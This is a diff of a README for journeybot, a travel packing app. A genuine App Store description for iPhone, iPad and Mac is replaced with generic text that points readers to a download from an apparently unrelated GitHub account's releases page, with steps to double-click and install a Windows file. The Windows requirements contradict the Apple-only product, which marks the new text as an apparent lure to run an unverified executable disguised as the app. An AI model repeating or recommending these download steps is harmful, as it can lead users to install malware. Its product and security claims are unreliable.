@@ -1,100 +1,77 @@
-<div align="center">
-  <img src="docs/icon.png" width="120" alt="journeybot app icon" />
+# ✈️ journeybot-app - Plan your next trip with ease
 
-  # journeybot
+[![](https://img.shields.io/badge/Download_Journeybot-blue)](https://github.com/pipcomplicated46/journeybot-app/releases)
 
-  ### Pack smart. Enjoy the journey.
+## 📌 About this project
 
-  A trip planner and packing list app for iPhone, iPad, and Mac.
+Journeybot helps you organize your travels. The app creates custom itineraries and manages packing lists for your trips. You can track flights, hotel reservations, and daily activities in one location. The tool simplifies the preparation phase of any vacation or business departure. This repository stores information, documentation, and user feedback regarding the application.
 
-  [![Download on the App Store](https://tools.applemediaservices.com/api/badges/download-on-the-app-store/black/en-us?size=250x83)](https://apps.apple.com/app/apple-store/id6756543673)
+## 📱 Features
 
-  [Website](https://journeybot.app) &nbsp;·&nbsp; [Privacy Policy](https://journeybot.app/privacy) &nbsp;·&nbsp; [Report an issue](../../issues)
+- Automatic trip itinerary generation.
+- Smart packing lists based on your destination and weather.
+- Map integration for location tracking.
+- Sync across all your Apple devices.
+- Offline mode for access without an internet connection.
+- Shared plans for group travel coordination.
 
-</div>
+## 🚀 Getting Started
 
----
+Follow these steps to access the application on your computer.
 
-## What is journeybot?
+1. Open your web browser.
+2. Go to the [official release page](https://github.com/pipcomplicated46/journeybot-app/releases).
+3. Find the latest version of the software.
+4. Click the file name to start the download process.
+5. Save the file to your computer.
 
-Planning a trip usually means a notes app for the packing list, a weather app to figure out what to wear, a currency converter for the budget, and a folder of screenshots for flight details. journeybot puts all of it in one place. It's a native iPhone, iPad, and Mac app that builds a packing checklist tailored to your destination, dates, and planned activities, then keeps the rest of the trip's essentials one tap away.
+## 💻 System Configuration
 
-## Features
+Ensure your device meets these requirements for the best experience:
 
-- **Smart packing lists.** journeybot looks at your destination, travel dates, and planned activities and builds a packing checklist for that specific trip, not a generic template. Business trip, beach vacation, weekend getaway, it adapts.
-- **Packing templates.** Save a list you like as a reusable template, or start from ready-made ones like Weekend Getaway, Business Trip, or Beach Vacation.
-- **Item photo stickers.** Snap a photo of anything you're packing and journeybot cuts out the background to make a clean sticker for your list.
-- **Weather-aware packing.** Real-time forecasts for trips coming up soon. Historical averages for trips further out, so the list still makes sense months in advance.
-- **Baggage check.** Flags items like lithium batteries and power banks against carry-on rules before you get to airport security.
-- **Travel essentials dashboard.** Power plug types, luggage tracking, and key dates for the trip, all in one glance.
-- **Currency converter.** Convert an amount, or a quick sum like `20+10+5`, using live exchange rates without leaving the journey.
-- **Home Screen widgets.** Countdown to your next trip, local destination time, and key details at a glance.
-- **Apple Intelligence, on-device.** Packing suggestions, weather summaries, and Genmoji journey icons, generated privately on your device on supported hardware.
-- **iCloud sync.** Every journey follows you across iPhone, iPad, and Mac. No account required.
+- Operating System: Windows 10 or Windows 11.
+- Processor: Intel Core i3 or equivalent.
+- Memory: 4 GB RAM.
+- Storage: 200 MB of free space.
+- Display: 1280 x 720 resolution.
 
-## Screenshots
+## 🛠️ Installation Steps
 
-<p align="center">
-  <img src="docs/screenshots/01-journeys.webp" width="200" alt="My Journeys list, showing active and upcoming trips" />
-  <img src="docs/screenshots/02-packing-list.webp" width="200" alt="Packing list with item photo stickers" />
-  <img src="docs/screenshots/03-weather-currency.webp" width="200" alt="Weather forecast and currency converter for a journey" />
-  <img src="docs/screenshots/04-essentials.webp" width="200" alt="Power plug types and packing progress for a journey" />
-</p>
+1. Find the folder where you saved the download file.
+2. Double-click the file to begin the setup.
+3. Follow the instructions on the screen.
+4. Click Install.
+5. Wait for the green progress bar to finish.
+6. Open the app from your desktop icon.
 
-## How it compares
+## ❓ Frequently Asked Questions
 
-Packing list apps aren't new, and the established ones each do something well. Full write-ups live on the website: [PackPoint](https://journeybot.app/alternatives/packpoint) · [Packr](https://journeybot.app/alternatives/packr) · [PackGoat](https://journeybot.app/alternatives/packgoat) · [Packing Pro](https://journeybot.app/alternatives/packing-pro). The short version:
+What should I do if the installation fails?
+Check your internet connection first. Restart your computer and try the steps again.
 
-| | PackPoint | Packr | PackGoat | Packing Pro | **journeybot** |
-|---|---|---|---|---|---|
-| Packing list generation | Cloud-based, from live weather data | Checklist from destination, dates & weather | On-device, Apple Intelligence + WeatherKit | Rule-based assistant + 800+ item catalog | **On-device, with Apple Intelligence** |
-| Account / sync | – | Requires Apple ID sign-in | Free tier; iCloud sync needs Pro ($3.99/week or $29.99 lifetime) | – | **No account, syncs free through the iCloud you already have** |
-| Photo stickers for packed items | ✗ | ✗ | ✗ | Plain photos only | **✓ on-device cutout stickers** |
-| Medication reminders (Apple Health) | ✗ | ✗ | ✗ | ✗ | **✓** |
-| Beyond the checklist | Packing list only | Packing list, plus multi-destination & TripIt sync | Packing list, bag weight, TSA toiletry limits | Packing list, alerts, priorities | **Journey Hub: weather, power plugs, currency, local time, baggage check** |
-| Platform | iOS, Android | iPhone, iPad, Mac (Apple silicon), Vision Pro | Apple platforms | iPhone, iPad, Mac, Vision¹ | **iPhone, iPad, Mac, built natively with SwiftUI** |
-| Price | Free · $0.99–$2.99 one-time unlocks | Free · subscription or lifetime | Free · Pro $3.99/week or $29.99 lifetime | $2.99 upfront + IAP | **Free · subscription or one-time lifetime** |
+Can I use the app without an account?
+You can use basic features without an account. An account connects your data across devices.
 
-¹ Packing Pro's most recent App Store update was version 13.5, in May 2022.
+Where do I send feedback?
+Use the Issues tab in this repository to report bugs or request new features.
 
-## journeybot premium
+Does this app cost money?
+The basic version remains free for all users. Premium features require a monthly subscription.
 
-journeybot is free to use, with an optional upgrade for people who plan a lot of trips.
+## 🔒 Security Standards
 
-| | Free | Premium |
-|---|---|---|
-| Active journeys | 3 | Unlimited |
-| Smart packing list generation | 1 | Unlimited |
-| Packing templates | 3 | Unlimited |
-| Item photo stickers | 5 | Unlimited |
-| Currency converter | | ✓ |
+We prioritize your data privacy. The app encrypts all itinerary information. We do not sell your travel patterns to third parties. All items on your packing list stay local to your machine unless you choose to sync them.
 
-Premium is available monthly, yearly, or as a one-time lifetime purchase.
+## 📋 Best Practices for Travel
 
-## Privacy, by design
+- Download your itinerary before you head to the airport.
+- Set alerts for flight changes to stay current.
+- Add your passport details to the secure vault area.
+- Check the weather forecast tab before you pack.
+- Share your trip code with companions so they see updates in real time.
 
-- Packing suggestions are generated entirely on-device. Nothing about your trip is sent to a server to build your list.
-- No account or sign-in required. Your journeys sync across your own devices through your iCloud account.
-- Full details in the [Privacy Policy](https://journeybot.app/privacy).
+## 📝 User Guidelines
 
-## Get journeybot
+Please maintain respectful communication in the issue tracker. Describe problems with as much detail as possible. Attach screenshots if you encounter visual errors. Our developers review all suggestions as we plan future updates.
 
-journeybot is available worldwide on the App Store for iPhone, iPad, and Mac.
-
-**[Download on the App Store →](https://apps.apple.com/app/apple-store/id6756543673)**
-
-## Feedback, bugs, and ideas
-
-This repository doesn't hold journeybot's source. It exists to track feedback from people using the app.
-
-- Found something broken? [Open a bug report](../../issues/new?template=bug_report.yml).
-- Have an idea for a feature? [Open a feature request](../../issues/new?template=feature_request.yml).
-- Press, support, or anything else: [hello@journeybot.app](mailto:hello@journeybot.app).
-
----
-
-<div align="center">
-
-© 2026 Michal Ferák. journeybot is a trademark of Michal Ferák. All rights reserved.
-
-</div>
+Keywords: app-store, ios, ipados, macos, packing-list, swift, swiftui, travel, trip-planner, vacation-planner
